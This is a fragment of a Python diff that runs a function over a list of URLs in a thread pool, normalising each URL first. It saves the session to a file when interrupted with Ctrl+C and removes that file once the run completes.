+	pool = ThreadPool(int(numthread))
+	for url in readsplit:
+		if "://" in url:
+			url = url
+		else:
+			url = "http://"+url
+		if url.endswith('/'):
+			url = url[:-1]
+		jagases = url
+		try:
+			pool.add_task(main, url)
+		except KeyboardInterrupt:
+			session = open(pid_restore, 'w')
+			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
+			session.write(cfgsession)
+			session.close()
+			print("CTRL+C Detect, Session saved")
+			exit()
+	pool.wait_completion()
+	try:
+		os.remove(pid_restore)
+	except:
+		pass
